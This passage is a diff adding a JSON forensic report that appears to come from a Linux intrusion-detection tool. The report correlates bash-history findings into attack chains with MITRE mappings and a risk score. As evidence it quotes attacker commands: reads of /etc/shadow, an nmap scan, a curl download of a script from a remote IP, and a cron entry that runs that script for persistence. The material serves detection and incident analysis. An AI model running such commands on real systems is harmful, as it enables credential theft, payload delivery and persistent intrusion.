+                        "SUSPICIOUS-CMD-0005"
+                    ],
+                    "indicators": [
+                        "curl "
+                    ],
+                    "metadata": {
+                        "category": "DOWNLOAD",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0003-STEP-02",
+                    "stage": "COMMAND_AND_CONTROL",
+                    "title": "Remote Network Download",
+                    "description": "The command downloads content from a remote network location. Observed command: curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+                    "timestamp": "2026-10-06T20:17:15.751006+00:00",
+                    "severity": "MEDIUM",
+                    "event_ids": [
+                        "BASH-00007"
+                    ],
+                    "finding_ids": [
+                        "NETWORK-ACTIVITY-0003"
+                    ],
+                    "indicators": [
+                        "curl http://"
+                    ],
+                    "metadata": {
+                        "category": "REMOTE_DOWNLOAD",
+                        "event_type": "NETWORK_ACTIVITY",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                }
+            ],
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0005",
+                "NETWORK-ACTIVITY-0003"
+            ],
+            "event_ids": [
+                "BASH-00007"
+            ],
+            "metadata": {
+                "stages": [
+                    "COMMAND_AND_CONTROL"
+                ],
+                "stage_count": 1,
+                "finding_count": 2,
+                "event_count": 1,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": [
+                    {
+                        "type": "TEMPORAL_CORRELATION",
+                        "reason": "Related findings occurred within the configured investigation window.",
+                        "duration_seconds": 0.0,
+                        "confidence": 80
+                    }
+                ],
+                "attack_sequence": [
+                    {
+                        "order": 1,
+                        "stage": "COMMAND_AND_CONTROL",
+                        "title": "Suspicious File Download Command",
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0005"
+                        ],
+                        "event_ids": [
+                            "BASH-00007"
+                        ]
+                    },
+                    {
+                        "order": 2,
+                        "stage": "COMMAND_AND_CONTROL",
+                        "title": "Remote Network Download",
+                        "finding_ids": [
+                            "NETWORK-ACTIVITY-0003"
+                        ],
+                        "event_ids": [
+                            "BASH-00007"
+                        ]
+                    }
+                ]
+            }
+        }
+    ],
+    "risk_score": {
+        "score": 100,
+        "severity": "CRITICAL",
+        "confidence": 100,
+        "factors": [
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0001",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0002",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0003",
+                "severity": "MEDIUM",
+                "points": 20
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0004",
+                "severity": "MEDIUM",
+                "points": 20
+            },
+            {
+                "type": "finding",
+                "finding_id": "SUSPICIOUS-CMD-0005",
+                "severity": "MEDIUM",
+                "points": 20
+            },
+            {
+                "type": "finding",
+                "finding_id": "PERSISTENCE-0001",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "PERSISTENCE-0002",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "NETWORK-ACTIVITY-0001",
+                "severity": "HIGH",
+                "points": 30
+            },
+            {
+                "type": "finding",
+                "finding_id": "NETWORK-ACTIVITY-0002",
+                "severity": "MEDIUM",
+                "points": 20
+            },
+            {
+                "type": "finding",
+                "finding_id": "NETWORK-ACTIVITY-0003",
+                "severity": "MEDIUM",
+                "points": 20
+            },
+            {
+                "type": "attack_chain",
+                "chain_id": "CHAIN-0001",
+                "reason": "multi-stage attack chain",
+                "points": 15
+            },
+            {
+                "type": "persistence",
+                "chain_id": "CHAIN-0001",
+                "points": 10
+            },
+            {
+                "type": "attack_chain",
+                "chain_id": "CHAIN-0002",
+                "reason": "multi-stage attack chain",
+                "points": 15
+            }
+        ]
+    },
+    "mitre": [
+        {
+            "technique_id": "T1003",
+            "name": "OS Credential Dumping",
+            "tactic": "Credential Access",
+            "description": "Credential-related system files or artifacts were accessed.",
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0001",
+                "SUSPICIOUS-CMD-0002"
+            ],
+            "event_ids": [
+                "BASH-00003",
+                "BASH-00004"
+            ]
+        },
+        {
+            "technique_id": "T1105",
+            "name": "Ingress Tool Transfer",
+            "tactic": "Command and Control",
+            "description": "Content was retrieved from a remote location.",
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0005",
+                "NETWORK-ACTIVITY-0003"
+            ],
+            "event_ids": [
+                "BASH-00007"
+            ]
+        },
+        {
+            "technique_id": "T1053.003",
+            "name": "Cron",
+            "tactic": "Persistence",
+            "description": "Cron-based persistence activity was detected.",
+            "finding_ids": [
+                "PERSISTENCE-0001",
+                "PERSISTENCE-0002"
+            ],
+            "event_ids": [
+                "BASH-00009",
+                "BASH-00010"
+            ]
+        },
+        {
+            "technique_id": "T1046",
+            "name": "Network Service Scanning",
+            "tactic": "Discovery",
+            "description": "Network services were enumerated.",
+            "finding_ids": [
+                "NETWORK-ACTIVITY-0001"
+            ],
+            "event_ids": [
+                "BASH-00005"
+            ]
+        },
+        {
+            "technique_id": "T1049",
+            "name": "System Network Connections Discovery",
+            "tactic": "Discovery",
+            "description": "Active network connections were enumerated.",
+            "finding_ids": [
+                "NETWORK-ACTIVITY-0002"
+            ],
+            "event_ids": [
+                "BASH-00006"
+            ]
+        }
+    ],
+    "attack_story": {
+        "title": "Linux Digital Detective Investigation",
+        "narrative": [
+            "Credential-access behavior was observed, indicating possible attempts to obtain or inspect authentication material.",
+            "Network reconnaissance activity was detected, indicating possible enumeration of services, network configuration, or active connections.",
+            "Persistence-related activity was detected, suggesting a possible attempt to maintain access beyond the initial session.",
+            "Remote content transfer or command-and-control behavior was observed."
+        ],
+        "conclusion": "The investigation identified security-relevant activity requiring further investigation. Overall assessed risk is CRITICAL (100/100).",
+        "risk_score": {
+            "score": 100,
+            "severity": "CRITICAL",
+            "confidence": 100,
+            "factors": [
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0001",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0002",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0003",
+                    "severity": "MEDIUM",
+                    "points": 20
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0004",
+                    "severity": "MEDIUM",
+                    "points": 20
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "SUSPICIOUS-CMD-0005",
+                    "severity": "MEDIUM",
+                    "points": 20
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "PERSISTENCE-0001",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "PERSISTENCE-0002",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "NETWORK-ACTIVITY-0001",
+                    "severity": "HIGH",
+                    "points": 30
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "NETWORK-ACTIVITY-0002",
+                    "severity": "MEDIUM",
+                    "points": 20
+                },
+                {
+                    "type": "finding",
+                    "finding_id": "NETWORK-ACTIVITY-0003",
+                    "severity": "MEDIUM",
+                    "points": 20
+                },
+                {
+                    "type": "attack_chain",
+                    "chain_id": "CHAIN-0001",
+                    "reason": "multi-stage attack chain",
+                    "points": 15
+                },
+                {
+                    "type": "persistence",
+                    "chain_id": "CHAIN-0001",
+                    "points": 10
+                },
+                {
+                    "type": "attack_chain",
+                    "chain_id": "CHAIN-0002",
+                    "reason": "multi-stage attack chain",
+                    "points": 15
+                }
+            ]
+        },
+        "attack_chains": [
+            {
+                "chain_id": "CHAIN-0001",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Reconstructed attack sequence: Credential Access \u2192 Persistence. The activity involved unidentified account(s) and unidentified source(s). 4 finding(s) were correlated. 1 correlation signal(s) support the reconstructed sequence.",
+                "severity": "HIGH",
+                "confidence": 60,
+                "start_time": "2026-10-06T20:17:15.750958+00:00",
+                "end_time": "2026-10-06T20:17:15.751060+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0001-STEP-01",
+                        "stage": "CREDENTIAL_ACCESS",
+                        "title": "Potential Credential or SSH Key Access",
+                        "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/passwd",
+                        "timestamp": "2026-10-06T20:17:15.750958+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00003"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0001"
+                        ],
+                        "indicators": [
+                            "/etc/passwd",
+                            "passwd"
+                        ],
+                        "metadata": {
+                            "category": "CREDENTIAL_ACCESS",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0001-STEP-02",
+                        "stage": "CREDENTIAL_ACCESS",
+                        "title": "Potential Credential or SSH Key Access",
+                        "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/shadow",
+                        "timestamp": "2026-10-06T20:17:15.750971+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00004"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0002"
+                        ],
+                        "indicators": [
+                            "/etc/shadow",
+                            "shadow"
+                        ],
+                        "metadata": {
+                            "category": "CREDENTIAL_ACCESS",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0001-STEP-03",
+                        "stage": "PERSISTENCE",
+                        "title": "Potential Cron Persistence",
+                        "description": "The command references cron configuration that can be used to execute commands automatically. Observed command: crontab -e",
+                        "timestamp": "2026-10-06T20:17:15.751052+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00009"
+                        ],
+                        "finding_ids": [
+                            "PERSISTENCE-0001"
+                        ],
+                        "indicators": [
+                            "crontab"
+                        ],
+                        "metadata": {
+                            "category": "CRON",
+                            "event_type": "PERSISTENCE_DETECTED",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0001-STEP-04",
+                        "stage": "PERSISTENCE",
+                        "title": "Potential Cron Persistence",
+                        "description": "The command references cron configuration that can be used to execute commands automatically. Observed command: echo \"*/10 * * * * /tmp/update.sh\" >> /var/spool/cron/crontabs/wwwadmin",
+                        "timestamp": "2026-10-06T20:17:15.751060+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00010"
+                        ],
+                        "finding_ids": [
+                            "PERSISTENCE-0002"
+                        ],
+                        "indicators": [
+                            "crontab",
+                            "/var/spool/cron"
+                        ],
+                        "metadata": {
+                            "category": "CRON",
+                            "event_type": "PERSISTENCE_DETECTED",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0001",
+                    "SUSPICIOUS-CMD-0002",
+                    "PERSISTENCE-0001",
+                    "PERSISTENCE-0002"
+                ],
+                "event_ids": [
+                    "BASH-00003",
+                    "BASH-00004",
+                    "BASH-00009",
+                    "BASH-00010"
+                ],
+                "metadata": {
+                    "stages": [
+                        "CREDENTIAL_ACCESS",
+                        "PERSISTENCE"
+                    ],
+                    "stage_count": 2,
+                    "finding_count": 4,
+                    "event_count": 4,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": [
+                        {
+                            "type": "TEMPORAL_CORRELATION",
+                            "reason": "Related findings occurred within the configured investigation window.",
+                            "duration_seconds": 0.000102,
+                            "confidence": 80
+                        }
+                    ],
+                    "attack_sequence": [
+                        {
+                            "order": 1,
+                            "stage": "CREDENTIAL_ACCESS",
+                            "title": "Potential Credential or SSH Key Access",
+                            "finding_ids": [
+                                "SUSPICIOUS-CMD-0001"
+                            ],
+                            "event_ids": [
+                                "BASH-00003"
+                            ]
+                        },
+                        {
+                            "order": 2,
+                            "stage": "CREDENTIAL_ACCESS",
+                            "title": "Potential Credential or SSH Key Access",
+                            "finding_ids": [
+                                "SUSPICIOUS-CMD-0002"
+                            ],
+                            "event_ids": [
+                                "BASH-00004"
+                            ]
+                        },
+                        {
+                            "order": 3,
+                            "stage": "PERSISTENCE",
+                            "title": "Potential Cron Persistence",
+                            "finding_ids": [
+                                "PERSISTENCE-0001"
+                            ],
+                            "event_ids": [
+                                "BASH-00009"
+                            ]
+                        },
+                        {
+                            "order": 4,
+                            "stage": "PERSISTENCE",
+                            "title": "Potential Cron Persistence",
+                            "finding_ids": [
+                                "PERSISTENCE-0002"
+                            ],
+                            "event_ids": [
+                                "BASH-00010"
+                            ]
+                        }
+                    ]
+                }
+            },
+            {
+                "chain_id": "CHAIN-0002",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Reconstructed attack sequence: Reconnaissance. The activity involved unidentified account(s) and unidentified source(s). 4 finding(s) were correlated. 1 correlation signal(s) support the reconstructed sequence.",
+                "severity": "HIGH",
+                "confidence": 56,
+                "start_time": "2026-10-06T20:17:15.750982+00:00",
+                "end_time": "2026-10-06T20:17:15.750997+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0002-STEP-01",
+                        "stage": "RECONNAISSANCE",
+                        "title": "Potential Network Reconnaissance Command",
+                        "description": "The command contains a network discovery or connection utility. Observed command: nmap -sV 192.0.2.0/24",
+                        "timestamp": "2026-10-06T20:17:15.750982+00:00",
+                        "severity": "MEDIUM",
+                        "event_ids": [
+                            "BASH-00005"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0003"
+                        ],
+                        "indicators": [
+                            "nmap "
+                        ],
+                        "metadata": {
+                            "category": "NETWORK_RECON",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0002-STEP-02",
+                        "stage": "RECONNAISSANCE",
+                        "title": "Potential Port Scanning Activity",
+                        "description": "A network scanning utility was executed and may indicate reconnaissance against network hosts or services. Observed command: nmap -sV 192.0.2.0/24",
+                        "timestamp": "2026-10-06T20:17:15.750982+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "BASH-00005"
+                        ],
+                        "finding_ids": [
+                            "NETWORK-ACTIVITY-0001"
+                        ],
+                        "indicators": [
+                            "nmap "
+                        ],
+                        "metadata": {
+                            "category": "PORT_SCAN",
+                            "event_type": "NETWORK_ACTIVITY",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0002-STEP-03",
+                        "stage": "RECONNAISSANCE",
+                        "title": "Potential Network Reconnaissance Command",
+                        "description": "The command contains a network discovery or connection utility. Observed command: ss -tulpn",
+                        "timestamp": "2026-10-06T20:17:15.750997+00:00",
+                        "severity": "MEDIUM",
+                        "event_ids": [
+                            "BASH-00006"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0004"
+                        ],
+                        "indicators": [
+                            "ss -"
+                        ],
+                        "metadata": {
+                            "category": "NETWORK_RECON",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0002-STEP-04",
+                        "stage": "RECONNAISSANCE",
+                        "title": "Network Connection Enumeration",
+                        "description": "The command enumerates active or listening network connections. Observed command: ss -tulpn",
+                        "timestamp": "2026-10-06T20:17:15.750997+00:00",
+                        "severity": "MEDIUM",
+                        "event_ids": [
+                            "BASH-00006"
+                        ],
+                        "finding_ids": [
+                            "NETWORK-ACTIVITY-0002"
+                        ],
+                        "indicators": [
+                            "ss -"
+                        ],
+                        "metadata": {
+                            "category": "CONNECTION_ENUMERATION",
+                            "event_type": "NETWORK_ACTIVITY",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0003",
+                    "NETWORK-ACTIVITY-0001",
+                    "SUSPICIOUS-CMD-0004",
+                    "NETWORK-ACTIVITY-0002"
+                ],
+                "event_ids": [
+                    "BASH-00005",
+                    "BASH-00006"
+                ],
+                "metadata": {
+                    "stages": [
+                        "RECONNAISSANCE"
+                    ],
+                    "stage_count": 1,
+                    "finding_count": 4,
+                    "event_count": 2,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": [
+                        {
+                            "type": "TEMPORAL_CORRELATION",
+                            "reason": "Related findings occurred within the configured investigation window.",
+                            "duration_seconds": 1.5e-05,
+                            "confidence": 80
+                        }
+                    ],
+                    "attack_sequence": [
+                        {
+                            "order": 1,
+                            "stage": "RECONNAISSANCE",
+                            "title": "Potential Network Reconnaissance Command",
+                            "finding_ids": [
+                                "SUSPICIOUS-CMD-0003"
+                            ],
+                            "event_ids": [
+                                "BASH-00005"
+                            ]
+                        },
+                        {
+                            "order": 2,
+                            "stage": "RECONNAISSANCE",
+                            "title": "Potential Port Scanning Activity",
+                            "finding_ids": [
+                                "NETWORK-ACTIVITY-0001"
+                            ],
+                            "event_ids": [
+                                "BASH-00005"
+                            ]
+                        },
+                        {
+                            "order": 3,
+                            "stage": "RECONNAISSANCE",
+                            "title": "Potential Network Reconnaissance Command",
+                            "finding_ids": [
+                                "SUSPICIOUS-CMD-0004"
+                            ],
+                            "event_ids": [
+                                "BASH-00006"
+                            ]
+                        },
+                        {
+                            "order": 4,
+                            "stage": "RECONNAISSANCE",
+                            "title": "Network Connection Enumeration",
+                            "finding_ids": [
+                                "NETWORK-ACTIVITY-0002"
+                            ],
+                            "event_ids": [
+                                "BASH-00006"
+                            ]
+                        }
+                    ]
+                }
+            },
+            {
+                "chain_id": "CHAIN-0003",
+                "title": "Correlated Linux Attack Chain",
+                "summary": "Reconstructed attack sequence: Command & Control. The activity involved unidentified account(s) and unidentified source(s). 2 finding(s) were correlated. 1 correlation signal(s) support the reconstructed sequence.",
+                "severity": "MEDIUM",
+                "confidence": 50,
+                "start_time": "2026-10-06T20:17:15.751006+00:00",
+                "end_time": "2026-10-06T20:17:15.751006+00:00",
+                "source_ips": [],
+                "usernames": [],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0003-STEP-01",
+                        "stage": "COMMAND_AND_CONTROL",
+                        "title": "Suspicious File Download Command",
+                        "description": "A command capable of downloading remote content was executed. Observed command: curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+                        "timestamp": "2026-10-06T20:17:15.751006+00:00",
+                        "severity": "MEDIUM",
+                        "event_ids": [
+                            "BASH-00007"
+                        ],
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0005"
+                        ],
+                        "indicators": [
+                            "curl "
+                        ],
+                        "metadata": {
+                            "category": "DOWNLOAD",
+                            "event_type": "SUSPICIOUS_COMMAND",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0003-STEP-02",
+                        "stage": "COMMAND_AND_CONTROL",
+                        "title": "Remote Network Download",
+                        "description": "The command downloads content from a remote network location. Observed command: curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+                        "timestamp": "2026-10-06T20:17:15.751006+00:00",
+                        "severity": "MEDIUM",
+                        "event_ids": [
+                            "BASH-00007"
+                        ],
+                        "finding_ids": [
+                            "NETWORK-ACTIVITY-0003"
+                        ],
+                        "indicators": [
+                            "curl http://"
+                        ],
+                        "metadata": {
+                            "category": "REMOTE_DOWNLOAD",
+                            "event_type": "NETWORK_ACTIVITY",
+                            "source": null,
+                            "evidence_sources": [
+                                "bash_history"
+                            ],
+                            "usernames": [],
+                            "source_ips": []
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0005",
+                    "NETWORK-ACTIVITY-0003"
+                ],
+                "event_ids": [
+                    "BASH-00007"
+                ],
+                "metadata": {
+                    "stages": [
+                        "COMMAND_AND_CONTROL"
+                    ],
+                    "stage_count": 1,
+                    "finding_count": 2,
+                    "event_count": 1,
+                    "evidence_sources": [
+                        "bash_history"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": [
+                        {
+                            "type": "TEMPORAL_CORRELATION",
+                            "reason": "Related findings occurred within the configured investigation window.",
+                            "duration_seconds": 0.0,
+                            "confidence": 80
+                        }
+                    ],
+                    "attack_sequence": [
+                        {
+                            "order": 1,
+                            "stage": "COMMAND_AND_CONTROL",
+                            "title": "Suspicious File Download Command",
+                            "finding_ids": [
+                                "SUSPICIOUS-CMD-0005"
+                            ],
+                            "event_ids": [
+                                "BASH-00007"
+                            ]
+                        },
+                        {
+                            "order": 2,
+                            "stage": "COMMAND_AND_CONTROL",
+                            "title": "Remote Network Download",
+                            "finding_ids": [
+                                "NETWORK-ACTIVITY-0003"
+                            ],
+                            "event_ids": [
+                                "BASH-00007"
+                            ]
+                        }
+                    ]
+                }
+            }
+        ],
+        "mitre_techniques": [
+            {
+                "technique_id": "T1003",
+                "name": "OS Credential Dumping",
+                "tactic": "Credential Access",
+                "description": "Credential-related system files or artifacts were accessed.",
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0001",
+                    "SUSPICIOUS-CMD-0002"
+                ],
+                "event_ids": [
+                    "BASH-00003",
+                    "BASH-00004"
+                ]
+            },
+            {
+                "technique_id": "T1105",
+                "name": "Ingress Tool Transfer",
+                "tactic": "Command and Control",
+                "description": "Content was retrieved from a remote location.",
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0005",
+                    "NETWORK-ACTIVITY-0003"
+                ],
+                "event_ids": [
+                    "BASH-00007"
+                ]
+            },
+            {
+                "technique_id": "T1053.003",
+                "name": "Cron",
+                "tactic": "Persistence",
+                "description": "Cron-based persistence activity was detected.",
+                "finding_ids": [
+                    "PERSISTENCE-0001",
+                    "PERSISTENCE-0002"
+                ],
+                "event_ids": [
+                    "BASH-00009",
+                    "BASH-00010"
+                ]
+            },
+            {
+                "technique_id": "T1046",
+                "name": "Network Service Scanning",
+                "tactic": "Discovery",
+                "description": "Network services were enumerated.",
+                "finding_ids": [
+                    "NETWORK-ACTIVITY-0001"
+                ],
+                "event_ids": [
+                    "BASH-00005"
+                ]
+            },
+            {
+                "technique_id": "T1049",
+                "name": "System Network Connections Discovery",
+                "tactic": "Discovery",
+                "description": "Active network connections were enumerated.",
+                "finding_ids": [
+                    "NETWORK-ACTIVITY-0002"
+                ],
+                "event_ids": [
+                    "BASH-00006"
+                ]
+            }
+        ],
+        "attack_path": [
+            "Credential Access",
+            "Persistence"
+        ],
+        "source_ips": [],
+        "usernames": [],
+        "finding_count": 10,
+        "chain_count": 3,
+        "highest_finding_severity": "HIGH",
+        "confidence": 100
+    }
+}
